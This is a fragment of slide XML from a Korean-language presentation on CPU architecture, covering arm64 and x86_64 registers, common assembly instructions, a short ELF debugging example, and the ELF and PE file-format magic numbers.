              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서의</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 주요 레지스터</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>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24F89C0-7E79-F28B-7512-AA862F577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870408"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1123046" y="2224215"/>
          <a:ext cx="9945908" cy="2750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1571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2748037351"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="6784337">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="820828031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="365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레지스터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3200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x0 ~ x7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 호출 시 인자 전달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(x0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은 함수 반환 값 저장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200448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x8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 호출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(arm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에서의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syscall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svc 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호출 시 호출할 함수 넘버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358619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x16, x17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외부 함수 호출 시 사용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(PLT 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참조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563335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x29 (FP)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현재 함수의 프레임 포인터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(x86_64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에서의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RBP)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00695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X30 (LR)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함수 종료 후 복귀 주소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(x86_64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에서의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RET)</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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6960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SP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스택 포인터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(x86_64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에서의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RSP)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578584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PC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다음에 수행할 명령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(x86_64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에서의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RIP)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528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205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1669D-7084-B6E3-6D17-BE9C6D32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B1D9AA6-08FF-FA51-970B-C8420F84F72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7192D-2AE8-E614-FD3E-63A2A91B0EF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4527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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>- Register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CFBE61-CA3D-2AA1-C977-9FC5B8B412CF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6988D2-442E-037C-0ACF-87BCBC956834}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="399062" y="1529413"/>
            <a:ext cx="5473418" cy="4997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6A0B48-2739-2B97-E333-F965AB9AA41A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6724350" y="4964829"/>
            <a:ext cx="4137474" cy="77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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>LR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>레지스터 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>0x4008e8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>값 주소 확인 시 전 명령인 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en-US" altLang="ko-KR" sz="1200" dirty="0" err="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>blr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t> x3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>에서 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>main() </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>함수 호출 후 복귀 주소인 것을 확인 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0"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FC6CB06-C36E-D39F-F94A-61FFEF56A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37" r="36504"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="399062" y="1529413"/>
            <a:ext cx="5473418" cy="51040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810014D-809E-E11E-6E3A-FAC4940C8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350" y="2164762"/>
            <a:ext cx="4219575" cy="8572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40CB89-6FB5-CF68-905A-152EFB8A853D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6724350" y="1507071"/>
            <a:ext cx="4137474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j-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>Arm64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>실행 파일 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>(ELF) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>디버깅 시 레지스터 확인 가능</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200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5DA500-6DE8-E357-90AD-18126BA1FBE5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6724350" y="3022012"/>
            <a:ext cx="4137474" cy="77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+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>현재 위치 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>백트레이스</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t> 확인 시 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>__</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0" err="1">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>libc_start_call_main</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>() 0x4008e8 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>위치가 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>ret </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="+mj-ea"/>
                <a:ea typeface="+mj-ea"/>
              </a:rPr>
              <a:t>위치인 것으로 확인</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1200" dirty="0">
              <a:latin typeface="+mj-ea"/>
              <a:ea typeface="+mj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287C7D3-9025-982D-0A4F-141F7E16EB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197" t="-11624" r="19276" b="11624"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6627358" y="4150852"/>
            <a:ext cx="5473419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7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5E399-3C48-CCE5-E90C-32F964891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690920-34E4-5A3E-B174-720F76EB2E09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B2C526-7A49-37E4-3BFA-E90E570F2213}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="8612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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>– ISA(Instruction Set Architecture)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7863-F3E5-1769-15A0-B7787F12196A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FE133-A776-7AFA-BFC3-16219211E6A4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1188720"/>
            <a:ext cx="9945909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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISA (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>명령어 집합</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1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란</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>,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>
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처에서 동작하는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명령어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(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어셈블리어</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1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를 의미합니다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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처에 따라 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ISA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>도 달라집니다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예를 들어</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, RSP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>스택에 값을 넣거나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빼주는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push &amp; pop </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>과 같은 명령어는 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>x86_64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에는 존재하지만 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>arm64 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처에는 존재하지 않습니다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en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>X86_64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아키텍처에서의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주요 명령어</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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B813E99-AF52-33C6-D900-065625144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962855"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1123046" y="2716252"/>
          <a:ext cx="9945909" cy="3779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1571">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2748037351"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3392169">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="820828031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3392169">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2835132750"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="262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명령어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3200"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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push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스택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(RSP)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push 0x1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200448"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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pop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스택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(RSP)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rax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358619"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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call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함수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call [</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="0" spc="-150" dirty="0" err="1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func_addr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]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00695"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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cmp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두 값 비교 연산</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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cmp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rax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0x1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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6960"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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je, </a:t>
                      </a:r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jg</a:t>
                      </a:r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jb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비교 연산 이후 플래그 값에 따른 분기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je [</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="14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func_addr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289467"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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mov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값을 옮겨주는 명령어</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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rax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0x3b</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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256947"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4454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lea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값을 옮겨주는 명령어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lea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rdi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[rip + 0x31b4] </a:t>
                      </a:r>
                    </a:p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lea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mov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달리 주소에 적힌 값을 옮김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714054"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="4454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syscall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 함수 호출 </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="ko-KR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유저 모드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-&gt; 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커널 모드 전환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syscall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134174"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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leave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 복귀 명령어 </a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="ko-KR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Leave : mov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rsp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rbp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+ pop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rbp</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" altLang="ko-KR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Ret : pop rip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517032"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="262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Ret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866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77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A1E06-D4AB-BE0E-545C-CC7D58FEA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B1E4FA-91F9-2CBA-374C-DB199179F588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D003A-164A-7B4F-AA71-D877000D1E6F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="86123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CPU </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>아키텍처 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ko-KR" sz="3600" spc="-300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>– ISA(Instruction Set Architecture)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B1DA7-5DDF-0756-5488-008A47D045AA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1,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2E26BF-925E-02E6-04A7-FA4483BF5C15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="132080" y="1188720"/>
            <a:ext cx="9945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b="1" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>arm64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아키텍처</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939"/>
                </a:solidFill>
              </a:rPr>
              <a:t>에서의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주요 명령어</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
              <a:solidFill>
                <a:srgbClr val="393939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080BC61-610D-0A54-8487-572E81877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483786"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="1123046" y="2325189"/>
          <a:ext cx="9945908" cy="34318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9512">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2748037351"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4033198">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="820828031"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="4033198">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3829946015"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="365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명령어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3200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str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레지스터를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sp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push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STR   X28, [SP, #0x140]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200448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ldr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sp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LDR  X8, [X8,  #0x28]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358619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bl, </a:t>
                      </a:r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blr</a:t>
                      </a:r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, </a:t>
                      </a:r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br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함수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BL     .__</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="0" spc="-150" dirty="0" err="1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strlen_chk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00695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subs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빼기 연산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조건 분기 전 사용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SUBS   W8, W8, W9 (W8 = W8 – W9)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6960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B.EQ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비교 연산 플래그 값에 따른 분기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B.EQ     loc_1120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289467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CBZ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특정 값에 따른 분기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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ko-KR" altLang="en-US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일때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분기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CBZ     W0, loc_EE0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256947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STP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레지스터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한번에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push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l-PL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STP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pl-PL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X0, X1, [X2, #8]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714054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LDP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sp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두개 한번에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LDP     X0, X1, [SP], #16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866713"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="340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RET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 복귀</a:t>
                      </a:r>
                      <a:endParaRPr lang="ko-KR" altLang="en-US" sz="14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RET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610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82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E87BA-6A9B-E317-D0E7-58EDE6647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38548D-E697-10F0-901A-5C2EA1E35F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4720" y="0"/>
            <a:ext cx="871728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CA94B16E-C0A4-EDF2-A06F-7987DD20274D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9B1C10-40D4-F3B6-6098-753C506C531B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1647264" y="3121223"/>
            <a:ext cx="1877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395967-F987-DBE0-B5B6-11DDC688F0DA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="3121223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B9F921D-B3AE-9CFB-407E-750DC44BC61C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240" y="282313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31C2B5D-ACBF-6020-3316-9F726A3CDB8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="904240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07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6E572-061A-4F66-860A-EA1641AD3DE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1765C-E4E1-440B-B3F6-AD127EB533CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875104" y="101916"/>
            <a:ext cx="4832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– Executable File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77FB6-6DE1-44E4-8EF8-7160153CD120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382DD1D-3E61-43E3-B03A-EE67FED38C01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="394908" y="4268723"/>
            <a:ext cx="3835281" cy="736033"/>
            <a:chOff x="157880" y="5390664"/>
            <a:chExt cx="3835281" cy="73603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8F335AD-9242-4BFA-A736-00EAA5C720F9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="828974" y="5818920"/>
              <a:ext cx="2607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400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Magic Number </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>(0x7F454C46) </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>확인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B71A00-85F1-4713-9F2D-29E0732C8014}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="157880" y="5390664"/>
              <a:ext cx="38352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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>ELF (Executable and Linkable Format)</a:t>
              </a:r>
              <a:endParaRPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="393939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5EA9CF4-4B02-4D79-9686-A8B683FEB8DB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="5029553" y="4209300"/>
            <a:ext cx="2711755" cy="743849"/>
            <a:chOff x="771888" y="5390664"/>
            <a:chExt cx="2711755" cy="74384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3EEFA88-3BDB-4986-A4E8-1D056235E726}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="876391" y="5826736"/>
              <a:ext cx="2607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400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Magic Number </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="1400" b="1" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>(0x4d5a9000) </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="1400" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>확인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94904B-FC61-4D90-BA0A-83761D16208E}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="771888" y="5390664"/>
              <a:ext cx="26072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spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>PE</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="ko-KR" altLang="en-US" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="2000" spc="-150" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>(Portable </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ko-KR" sz="2000" spc="-150" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="393939"/>
                  </a:solidFill>
                  <a:latin typeface="+mj-ea"/>
                  <a:ea typeface="+mj-ea"/>
                </a:rPr>
                <a:t>Exectuable</a:t>
              </a:r>
